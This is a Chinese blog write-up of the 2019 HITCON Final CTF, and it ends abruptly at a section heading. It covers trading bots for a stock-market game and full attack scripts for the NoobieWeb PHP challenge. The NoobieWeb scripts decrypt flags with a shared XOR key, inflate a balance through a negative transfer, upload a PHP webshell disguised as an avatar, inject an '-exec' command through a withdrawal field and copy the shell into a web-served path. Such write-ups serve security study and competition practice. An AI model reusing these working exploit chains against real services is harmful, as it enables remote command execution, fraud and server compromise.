---
layout: post
title: 2019 HITCON-Final Web WP
category: CTF
catalog: true
excerpt: HITCON final，Web 题解, AWD, Market, NoobieWeb, Stupid Robot
time: 2019.12.23 11:25:00
tags:
- CTF
- WP

---
# 2019 HITCON-Final  Web WP

CTF生涯的第一个国际赛冠军，Tea Deliverers tql！！！

![TD](https://momomoxiaoxi.com/img/post/HITCON2019/TD.jpg)

![WX20191217-231111@2x](https://momomoxiaoxi.com/img/post/HITCON2019/WX20191217-231111@2x.png)

主办方组织得很好～HITCON比赛非常有趣，尤其那个魔性的一血音乐，超级洗脑～😂

KOH是一个股票题，杀猪盘炒股票。新型的Web打patch方式，也比较有意思。食物、招待都很周到。

不过，因为主办方同时给了攻击流量和大家的patch，这导致大家都互相抄流量和patch。对挖洞的激励不是很好。而我们之所以能够夺冠，很大程度上也是因为我们写出了一个带混淆的攻击方式，导致大家没办法抄我们的作业，2333.

比赛现场图：

![9101576581720_.pic_hd](https://momomoxiaoxi.com/img/post/HITCON2019/9101576581720_pic_hd.jpg)

![9111576581721_.pic_hd](https://momomoxiaoxi.com/img/post/HITCON2019/9111576581721_pic_hd.jpg)

注：本博客仅放了三个题目的WP，具体的细节以及英文WP可以参考，Tea Deliverers的[Github](https://github.com/tea-deliverers/ctf-writeups/tree/master/hitcon2019-final)。

---

## Market

![market1](https://momomoxiaoxi.com/img/post/HITCON2019/market1.jpg)

![market2](https://momomoxiaoxi.com/img/post/HITCON2019/market2.jpg)

题干：

```
Earn money in stock
https://10.217.0.0
This is a KOH challenge. Login to your account with your team token, and start trading.
Your score is your account balance (cash). After the challenge end, the value of any security you still hold will be calculated as its net worth, which is 1/50 of the correspond team score of the security.
Please do not attack the service. Enjoy the market itself. If any unintended behavior occurs, we will fix the service and may roll-back if needed.

```

这是一个很有趣的KOH题目(割韭菜题目orz).主办方实现了一套股票市场（加密货币市场？）。在比赛开始，每个队伍都有一定的初始资金，大家需要通过一定的操作来赚得足够的金钱。当比赛结束时，拥有更多金钱的队伍分数越高。

整个比赛，我们战队的策略大概可以分为三种。

在第一天，kericwy和我在低价的位置大量收购了一波货币。后面，突然HXP、LCBC进行了拉盘，价格一度爆拉到1w多一枚币。这时候，我们趁机疯狂出货，赚的第一桶金，直接刷到750多万。事实证明，想要暴富还是得割韭菜😂。当然，你还需要一个手速贼快的神级股票交易员@kericwy😊。这个时候，我们已经拥有整个市场40%左右的资金了。

![market3](https://momomoxiaoxi.com/img/post/HITCON2019/market3.png)

这时候，我们准备学习庄家操盘手法，进行拉盘。尝试了几次，实在不会拉杀猪盘，非常尴尬。

> 比赛结束后，咨询了LCBC的小哥，他们好像是通过直接挂高价单卖，然后再通过自己疯狂吃单来哄抬币价的。因为整个币的价格会暴涨，市场上的散户（出题人的机器人？？）便会冲进来吃币价，从而割韭菜。或许这就是杀猪盘吧😂tql

因为实在太菜，不会拉盘。我们就写了一个捡漏脚本，直接吃低价的卖单，然后挂高价单卖单。因为整个市场和正常的股票市场是不一样的，整个比赛市场非常不理性。有时候会有超低的卖单，有时候会有超高的买单。

代码如下：

```python
from market import *
import os
import numpy as np
import time

"""
moxiaoxi 捡漏脚本，低价收，高价抛
"""

SYMBOL = 'TSEC'  # 合约代码
START_PRICE = 450  # 起始价位
SECURE_BALANCE = 731000  # 安全金额，低于这个金额交停止，防止黑天鹅
HIGH_PRICE = 1000  # 高价抛出价格
LOW_PRICE = 400  # 低价买入价格
ONE_TICKET = 5  # 一次最大交易量
MAX_QTY = 500  # 币的最多持仓数量
LAST_SELL_PRICE = []  # 最近的挂出去的卖单价格，主要用于哄抬物价
LAST_BUY_PRICE = []  # 最近挂出去的买单价格


async def get_avg_price(instmt, ws3):
    end = 100
    start = 0
    his = await get_history(ws3, instmt, start=start, end=end)
    print(his)
    avg_price = 0
    for h in his:
        avg_price += (h[1] + h[2]) / 2
    avg_price = avg_price / (end - start)
    print(avg_price)


# # 依据历史价格，更新HIGH_PRICE和LOW_PRICE
# def update_price():
#     avg_sell = np.mean(LAST_SELL_PRICE)
#     if avg_sell
#     # 去除历史信息
#     if len(LAST_SELL_PRICE) > 5:
#         LAST_SELL_PRICE.remove(LAST_SELL_PRICE[0])
#     if len(LAST_BUY_PRICE) > 5:
#         LAST_BUY_PRICE.remove(LAST_BUY_PRICE[0])


## 捡漏脚本，低于多少收，高于多少卖出
async def onTick(ws1, ws2):
    myaccount = await check_my_account(ws1)
    balance = int(myaccount['balance'])
    # update_price()
    # 安全风险预警，防止黑天鹅
    if balance < SECURE_BALANCE:
        logger.warning("warning!! balance < {}".format(SECURE_BALANCE))
        os._exit(-1)
    # 购买价格超过预估市场价，比这个市场价更多的价格卖出
    ticket = await get_ticket(ws2)
    data = ticket[SYMBOL]
    price_buy = data[0][0]  # 当前买价格
    if price_buy > HIGH_PRICE:
        index = SYMBOL + '.qty'
        qty = int(myaccount[index])
        if qty > 0:
            my_sell_num = min(qty, ONE_TICKET)
            my_price_sell = price_buy
            await sell(ws1, SYMBOL, my_price_sell, my_sell_num)
            logger.info('Sell,instmt:{},my_price_sell:{},my_sell_num:{}'.format(SYMBOL, my_price_sell, my_sell_num))
            # 等待市场冷静
            time.sleep(2)

    # 如果售卖价格远远低于市场价，买入
    ticket = await get_ticket(ws2)
    data = ticket[SYMBOL]
    price_sell = data[0][1]  # 当前卖价格
    if price_sell < LOW_PRICE:
        my_price_buy = price_sell
        index = SYMBOL + '.qty'
        qty = int(myaccount[index])
        if qty < MAX_QTY:
            my_buy_num = min(balance / my_price_buy, ONE_TICKET)
            my_price_buy = price_sell
            await buy(ws1, SYMBOL, my_price_buy, my_buy_num)
            logger.info('Buy,instmt:{},my_price_buy:{},my_buy_num:{}'.format(SYMBOL, my_price_buy, my_buy_num))
            # 等待市场冷静
            time.sleep(2)
    return


if __name__ == "__main__":
    async def exp():
        async with websockets.connect('ws://10.217.0.0:5000') as ws1, websockets.connect(
                "ws://10.217.0.0:5001") as ws2, websockets.connect(
            "ws://10.217.0.0:5002") as ws3:
            # login
            flag = await init(ws1)
            if flag == False:
                logger.warning("Exit!")
                sys.exit()
            account = await check_my_account(ws1)
            await get_avg_price(SYMBOL, ws3)
            while True:
                await onTick(ws1, ws2)


    asyncio.get_event_loop().run_until_complete(exp())

```

前面的策略主要吃暴涨暴跌的策略。后面我们实现了一个网格交易策略。网格交易是一个很好的量化交易策略，胜率蛮高，尤其在震荡盘时，收益比较大。之所以不考虑趋势交易是因为后期整个交易量不大，在分钟级别趋势的胜率很低。

原理如下：

我们定好一个基准价，然后划分好网格，定好每次买入一份的金额，按照上升下降的趋势，每上升一格买入一份，每下降一个卖出一份，每次只赚一个网格中买入卖出的差价，算是一种比较求稳的交易策略。如果估价波动大的话赢利会高些，波动小的话可以把网格调小，主要是网格大小和每次卖出买入数量的调整

策略介绍：https://www.jianshu.com/p/81656d6c7ceb

代码参考：https://www.bookstack.cn/read/typical-strategy/4.md

​					https://www.shinnytech.com/blog/grid-trading/

代码：

```python

from market import *
import os
import time
from functools import reduce

"""
moxiaoxi 网格交易法
"""
SYMBOL = 'RPSC'  # 合约代码
START_PRICE = 470  # 起始价位
GRID_AMOUNT = 10  # 网格在多头、空头方向的格子(档位)数量
grid_region_long = [0.009] * GRID_AMOUNT  # 多头每格价格跌幅(网格密度)
grid_region_short = [0.009] * GRID_AMOUNT  # 空头每格价格涨幅(网格密度)
grid_volume_long = [i*2 for i in range(GRID_AMOUNT + 1)]  # 多头每格持仓手数
grid_volume_short = [i*2 for i in range(GRID_AMOUNT + 1)]  # 空头每格持仓手数
grid_prices_long = [reduce(lambda p, r: p * (1 - r), grid_region_long[:i], START_PRICE) for i in
                    range(GRID_AMOUNT + 1)]  # 多头每格的触发价位列表
grid_prices_short = [reduce(lambda p, r: p * (1 + r), grid_region_short[:i], START_PRICE) for i in
                     range(GRID_AMOUNT + 1)]  # 空头每格的触发价位列表

logger.info("策略开始运行, 起始价位: %f, 多头每格持仓手数:%s, 多头每格的价位:%s, 空头每格持仓手数:%s, 空头每格的价位:%s" % (
    START_PRICE, grid_volume_long, grid_prices_long, grid_volume_short, grid_prices_short))


# 更新行情，以及提交订单
async def wait_update(ws1, ws2, target_pos):
    quote = await get_ticket(ws2)
    last_price = int(quote[SYMBOL][1][0])
    account = await check_my_account(ws1)
    now_pos = int(account[SYMBOL + '.qty'])
    if now_pos > target_pos:
        await sell(ws1, SYMBOL, last_price, now_pos - target_pos)
        logger.info('Sell,instmt:{},my_price_sell:{},my_sell_num:{}'.format(SYMBOL, last_price, now_pos - target_pos))
    elif now_pos < target_pos:
        await buy(ws1, SYMBOL, last_price, target_pos - now_pos)
        logger.info('Buy,instmt:{},my_price_buy:{},my_buy_num:{}'.format(SYMBOL, last_price, target_pos - now_pos))
    return last_price


async def wait_price(layer, ws1, ws2, ws3, origin_pos, target_pos):
    """等待行情最新价变动到其他档位,则进入下一档位或回退到上一档位; 如果从下一档位回退到当前档位,则设置为当前对应的持仓手数;
        layer : 当前所在第几个档位层次; layer>0 表示多头方向, layer<0 表示空头方向
    """
    last_price = await wait_update(ws1, ws2, target_pos)
    # print(last_price)
    if layer > 0 or last_price <= grid_prices_long[1]:
        # 多头方向
        while True:
            last_price = await wait_update(ws1, ws2, target_pos)
            # 如果当前档位小于最大档位,并且最新价小于等于下一个档位的价格: 则设置为下一档位对应的手数后进入下一档位层次
            if layer < GRID_AMOUNT and last_price <= grid_prices_long[layer + 1]:
                target_pos = origin_pos + grid_volume_long[layer + 1]
                logger.info("最新价: %f, 进入: 多头第 %d 档" % (last_price, layer + 1))
                await wait_price(layer + 1, ws1, ws2, ws3, origin_pos, target_pos)
                target_pos = origin_pos + grid_volume_long[layer + 1]
            # 如果最新价大于当前档位的价格: 则回退到上一档位
            if last_price > grid_prices_long[layer]:
                logger.info("最新价: %f, 回退到: 多头第 %d 档" % (last_price, layer))
                return
    elif layer < 0 or last_price >= grid_prices_short[1]:  # 是空头方向
        layer = -layer  # 转为正数便于计算
        while True:
            last_price = await wait_update(ws1, ws2, target_pos)
            # 如果当前档位小于最大档位层次,并且最新价大于等于下一个档位的价格: 则设置为下一档位对应的持仓手数后进入下一档位层次
            if layer < GRID_AMOUNT and last_price >= grid_prices_short[layer + 1]:
                target_pos = origin_pos - grid_volume_short[layer + 1]
                logger.info("最新价: %f, 进入: 空头第 %d 档" % (last_price, layer + 1))
                await wait_price(-(layer + 1), ws1, ws2, ws3, origin_pos, target_pos)
                # 从下一档位回退到当前档位后, 设置回当前对应的持仓手数
                target_pos = origin_pos - grid_volume_short[layer + 1]
            # 如果最新价小于当前档位的价格: 则回退到上一档位
            if last_price < grid_prices_short[layer]:
                logger.info("最新价: %f, 回退到: 空头第 %d 档" % (last_price, layer))
                return


if __name__ == "__main__":
    async def exp():
        async with websockets.connect("ws://10.217.0.0:5000") as ws1, websockets.connect(
                "ws://10.217.0.0:5001") as ws2, websockets.connect(
            "ws://10.217.0.0:5002") as ws3:
            # login
            flag = await init(ws1)
            if flag == False:
                logger.warning("Exit!")
                sys.exit()
            account = await check_my_account(ws1)
            logger.info('持仓情况：{}'.format(account))
            origin_pos = int(account[SYMBOL + '.qty'])  # 本来的持仓数量
            target_pos = origin_pos  # 目标持仓数量
            while True:
                await wait_update(ws1, ws2, target_pos)
                await wait_price(0, ws1, ws2, ws3, origin_pos, target_pos)
                target_pos = origin_pos


    asyncio.get_event_loop().run_until_complete(exp())

```

比赛结束，回过头来反思一下整个market的比赛。

- **杀猪盘永远是最赚钱的。**我们最后拥有大概800多w的金额，主要的资金还是靠一开始的割韭菜积累的。
- **大量资产会帮助你，也会束缚你。**后续，两个量化脚本之所以没有赚到很多钱。是因为我总担心这个代码存在一些bug，导致被别人割韭菜。所以就束手束脚，运行了没几轮以后，就下线了（因为得赶着做其他题目，没办法盯着脚本）。现在回过头来想，当时应该可以考虑设置一些预警、边界，然后整体运行起来。这两个量化策略本质上对于市场是有效的。
- **没有模拟回测下的量化策略太难了。**整个市场与真实市场区别还是很大，一则看不到交易深度，二则没办法撤单，导致很多策略没办法实现。而且会干扰到脚本处理逻辑。
- **要深入理解，思考市场的本质。**如果理性分析，就能大概率推测出，整个大盘肯定是会暴涨的。因为选手一开始只有金钱，没有币。那么选手很难进行砸盘，只能爆啦。而且，随着各类散户的进场，市场的泡沫肯定会上升。因此，可以看到，整个币价在两天是依次上升的。

----

## NoobieWeb

> 题目环境：[NoobieWeb](https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/HITCON2019/noobieweb)

![noobie_bank](https://momomoxiaoxi.com/img/post/HITCON2019/noobie_bank.png)

这个题目是一个传统的PHP题目。我们可以通过预加载的方式，加载一个waf.php，用来进行防御。不过，值得注意的一点是，waf.php有长度限制，大约只能写10来行。另外，选手并没有服务器的权限，运维理论上只能靠waf.php。

这个题目有一些非常明显的漏洞，就不再多说了。我们主要打了两个洞。一个洞比较难修，一个洞可以RCE，方便我们后渗透做权限维持。

第一个洞，是购买一个股票后，会生成一个加密的文件。它用的`StrongSecretKeyForDeveloping >.^`进行xor加密的。因为大家的密钥都是一样的，因此就都能解开。

攻击脚本如下:

```python
from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback
import requests
import re, random, string

session = requests.Session()


def filter_flag(string):
    p = re.compile(r'[0-9a-z\-]{36}')
    # p = re.compile(r'hctf\{.*\}')
    r = p.findall(string)
    return r[0]


def register(ip, username, password, hash_algo='sha1'):
    paramsGet = {"op": "register", "action": "user"}
    paramsPost = {"hash_algo": hash_algo, "password": password, "submit": "Register", "username": username}
    headers = {"Origin": "https://10.0.10.5",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36",
               "Referer": "https://10.0.10.5/?action=user&op=register", "Connection": "close",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
               "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post("https://{}/".format(ip), data=paramsPost, params=paramsGet, headers=headers)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if 'Register failed' in response.content:
        print('Register failed:{}'.format(username))
        return False
    if 'Register success' in response.content:
        print('Register success:{}'.format(username))
        return True
    print('Register error!{}'.format(username))
    return False


def login(ip, username, password):
    paramsGet = {"op": "login", "action": "user"}
    paramsPost = {"password": password, "submit": "Login", "username": username}
    headers = {"Origin": "https://10.0.10.5",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36",
               "Referer": "https://10.0.10.5/?action=user&op=login", "Connection": "close",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
               "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post("https://{}/".format(ip), data=paramsPost, params=paramsGet, headers=headers)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if 'Login failed' in response.content:
        print('Login failed:{}'.format(username))
        return False
    if "Let's buy some" in response.content:
        print('Login succ:{}'.format(username))
        return True


def buy(ip, name='JPM', note='1', amount='1', hash='sha1'):
    paramsGet = {"op": "buy", "action": "bank"}
    paramsPost = {"name": name, "note": note, "amount": amount, "hash": hash}
    headers = {"Origin": "https://10.0.10.5",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36",
               "Referer": "https://10.0.10.5/", "Connection": "close", "Accept-Encoding": "gzip, deflate",
               "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8"}
    response = session.post("https://{}/".format(ip), data=paramsPost, params=paramsGet, headers=headers)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    res = response.content
    p = res.split("cert'>")[1].split("</a>")[0]
    return p


def get_data(ip, p):
    target_path = "https://{}/{}".format(ip, p)
    response = session.get(target_path)
    # print(response.content)
    res = response.content
    return res


def exp(res):
    key = "StrongSecretKeyForDeveloping >.^".encode()

    def dec(key, byte):
        flag = ""
        n1 = len(key)
        n2 = len(byte)
        n = max(n1, n2)
        # for ($i = 0; $i < $n; $i++) {
        # $out.= chr(ord($key[$i % $n1]) ^ ord($string[$i % $n2]));
        # }
        # return $out;
        i = 0
        while i < n:
            a = ord(key[i % n1]) ^ ord(byte[i % n2])
            flag += chr(a)
            i += 1
        print(flag)
        # out
        return flag

    data = res[16 * 3 + 8:16 * 3 + 8 + 32]
    # print(data)
    flag = dec(key, data)
    return flag


def vulnerable_attack(target, target_port, cmd):
    '''
    '''
    try:
        salt = ''.join(random.sample(string.ascii_letters + string.digits, 8))
        username = 'moxiaoxi' + salt
        password = 'moxiaoxi'
        register(target, username, password)
        login(target, username, password)
        p = buy(target, name='JPM', note='1', amount='1', hash='sha1')
        res = get_data(target, p)
        flag = exp(res)
        if "HITCON" in flag:
            debug_print(flag)
            flag = cmd_prefix + flag + cmd_postfix
        else:
            flag = 'get flag error'
        return flag
    except Exception, e:
        debug_print(traceback.format_exc())
        dump_error("attack failed", target, "vulnerable attack")
        res = "error"
    return res

```

因为特别难修，我们前期靠这个脚本长期收割全场。

![1](https://momomoxiaoxi.com/img/post/HITCON2019/1.png)







第二个洞的利用链比较长。

- 攻击者首先通过转账功能，通过负数可以进行转账，将自己的金额提高到1000以上；
- 然后，修改头像处，上传一个文件后门；
- 最后，在进行cash_out处，进行任意命令执行（/cash_out 'a -exec sleep 2 ;' 2）。主要在exec后进行命令执行，不过此时`>`和`|`都不能用。最后的命令执行，还靠wupco师傅发现的，通过cp一个可控的文件，进行命令执行。

之所以需要这么繁琐，主要是因为cash_out处的命令执行操作限制比较大，这一块卡了很久。

攻击脚本：

```bash
# coding:utf-8
from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback
import requests
import re, random, string

session = requests.Session()


def filter_flag(string):
    p = re.compile(r'[0-9a-z\-]{36}')
    # p = re.compile(r'hctf\{.*\}')
    r = p.findall(string)
    return r[0]


def register(ip, username, password, hash_algo='sha1'):
    paramsGet = {"op": "register", "action": "user"}
    paramsPost = {"hash_algo": hash_algo, "password": password, "submit": "Register", "username": username}
    headers = {"Origin": "https://10.0.10.5",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36",
               "Referer": "https://10.0.10.5/?action=user&op=register", "Connection": "close",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
               "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post("https://{}/".format(ip), data=paramsPost, params=paramsGet, headers=headers)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if 'Register failed' in response.content:
        print('Register failed:{}'.format(username))
        return False
    if 'Register success' in response.content:
        print('Register success:{}'.format(username))
        return True
    print('Register error!{}'.format(username))
    return False


def login(ip, username, password):
    paramsGet = {"op": "login", "action": "user"}
    paramsPost = {"password": password, "submit": "Login", "username": username}
    headers = {"Origin": "https://10.0.10.5",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36",
               "Referer": "https://10.0.10.5/?action=user&op=login", "Connection": "close",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
               "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post("https://{}/".format(ip), data=paramsPost, params=paramsGet, headers=headers)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if 'Login failed' in response.content:
        print('Login failed:{}'.format(username))
        return False
    if "Let's buy some" in response.content:
        print('Login succ:{}'.format(username))
        return True


def buy(ip, name='JPM', note='1', amount='1', hash='sha1'):
    paramsGet = {"op": "buy", "action": "bank"}
    paramsPost = {"name": name, "note": note, "amount": amount, "hash": hash}
    headers = {"Origin": "https://10.0.10.5",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36",
               "Referer": "https://10.0.10.5/", "Connection": "close", "Accept-Encoding": "gzip, deflate",
               "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8"}
    response = session.post("https://{}/".format(ip), data=paramsPost, params=paramsGet, headers=headers)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    res = response.content
    p = res.split("cert'>")[1].split("</a>")[0]
    return p


def get_data(ip, p):
    target_path = "https://{}/{}".format(ip, p)
    response = session.get(target_path)
    # print(response.content)
    res = response.content
    return res


def exp(res):
    key = "StrongSecretKeyForDeveloping >.^".encode()

    def dec(key, byte):
        flag = ""
        n1 = len(key)
        n2 = len(byte)
        n = max(n1, n2)
        # for ($i = 0; $i < $n; $i++) {
        # $out.= chr(ord($key[$i % $n1]) ^ ord($string[$i % $n2]));
        # }
        # return $out;
        i = 0
        while i < n:
            a = ord(key[i % n1]) ^ ord(byte[i % n2])
            flag += chr(a)
            i += 1
        print(flag)
        # out
        return flag

    data = res[16 * 3 + 8:16 * 3 + 8 + 32]
    # print(data)
    flag = dec(key, data)
    return flag


def trans(ip, to_user='moxiaoxi2', cash='-1'):
    paramsGet = {"op": "send_cash", "action": "bank"}
    paramsPost = {"to_user": to_user, "reason": "1", "submit": "Submit", "cash": cash}
    headers = {"Origin": "https://10.0.15.5",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36",
               "Referer": "https://10.0.15.5/?action=bank&op=send_cash", "Connection": "close",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
               "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post("https://{}".format(ip), data=paramsPost, params=paramsGet, headers=headers)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if 'Send cash success' in response.content:
        print('Send cash success!')
        return True
    print("Send cash failed!")
    return False


def check_mony(ip,data='test'):
    paramsGet = {"op": "profile", "action": "user"}
    paramsPost = {"hash_algo": "sha1", "password": "", "info": ""}
    paramsMultipart = [('avatar', ('1.txt', data, 'application/png'))]
    headers = {"Origin": "https://10.0.15.5",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36",
               "Referer": "https://10.0.15.5/?action=user&op=profile", "Connection": "close",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8"}
    response = session.post("https://{}/".format(ip), data=paramsPost, files=paramsMultipart, params=paramsGet,
                            headers=headers)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    res = response.content
    m = res.split('moxiaoxi:')[1].split('</a>')[0]
    m = float(m.strip())
    if 'Edit profile success' in response.content:
        print('Edit profile success!')
        return True, m
    print("Edit profile Failed!")
    return False, m


def cash_out(target, amount='5000', username='moxiaoxi'):
    paramsGet = {"op": "cash_out", "action": "bank"}
    paramsPost = {"amount": amount, "submit": "Submit", "account": username}
    headers = {"Origin": "https://10.0.15.5",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36",
               "Referer": "https://10.0.15.5/?action=bank&op=cash_out", "Connection": "close",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
               "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post("https://{}/".format(target), data=paramsPost, params=paramsGet, headers=headers)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if 'The withdrawal log' in response.content:
        print("Withdrawal Succ!")
        return True
    print("Withdrawal Failed!")
    return False


def rce(target, amount='5000', username='moxiaoxi', cmd='sleep 2'):
    paramsGet = {"op": "cash_out", "action": "bank"}
    end_cmd = username + ' -exec {} ;'.format(cmd)
    print(end_cmd)
    paramsPost = {"amount": amount, "submit": "Submit", "account": end_cmd}
    headers = {"Origin": "https://10.0.15.5",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36",
               "Referer": "https://10.0.15.5/?action=bank&op=cash_out", "Connection": "close",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
               "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post("https://{}/".format(target), data=paramsPost, params=paramsGet, headers=headers)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if 'The withdrawal log' in response.content:
        print("RCE Succ!")
        return True
    print("RCE Failed!")
    return False


def use_webshell(target,cmd):
    session = requests.Session()
    paramsGet = {"moxiaoxi": cmd}
    headers = {"Cache-Control": "max-age=0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
               "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36",
               "Connection": "close", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8"}
    cookies = {
        "auth": "Tzo4OiJVc2VyRGF0YSI6OTp7czo4OiJ1c2VybmFtZSI7czo4OiJtb3hpYW94aSI7czo0OiJwZXJtIjtzOjE6IjEiO3M6MjoiaWQiO3M6MToiNCI7czo1OiJub25jZSI7czoxMDoiMTc5NjcyMjQ3MSI7czo4OiJwYXNzd29yZCI7czo0MDoiZDdjYmRiZjZjZTNhNmVlZWZiZGI5MjAyODE3MDBiYWFkMDQ4ZDMyYiI7czo5OiJoYXNoX2FsZ28iO3M6NDoic2hhMSI7czo0OiJjYXNoIjtkOjk5OTk5OTY5NTAwO3M6NDoiaW5mbyI7czowOiIiO3M6NjoiYXZhdGFyIjtzOjA6IiI7fQ%3D%3D.sha1.7cf0c61f1ffe89322e866ecbb2219e799528bd95",
        "algo": "sha1"}
    response = session.get("https://{}/data/cash_out/1.php".format(target), params=paramsGet, headers=headers, cookies=cookies)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    return response.content


def attack_one(target,cmd):
    '''
    '''
    salt = ''.join(random.sample(string.ascii_letters + string.digits, 10))
    username = 'moxiaoxi'
    password = 'moxiaoxi'
    register(target, username, password)
    login(target, username, password)
    trans(target, to_user='moxiaoxi2', cash='-5e10')
    data = "<?php system($_REQUEST['moxiaoxi']);?>"
    check_mony(target,data)
    attack_username = username + salt
    # 第一次写
    cash_out(target, username=attack_username)
    #  第二次rce
    rce(target, amount='5000', username=attack_username, cmd=cmd)



def vulnerable_attack(target, target_port, cmd):
    try:
        first_cmd = "cp /var/www/html/data/avatar/1.txt /var/www/html/data/cash_out/1.php"
        attack_one(target, cmd=first_cmd)
        real_cmd = cmd
        res = use_webshell(target, real_cmd).strip()
    except Exception, e:
        debug_print(traceback.format_exc())
        dump_error("attack failed", target, "vulnerable attack")
        res = "error"
    return res


```

打down服务：

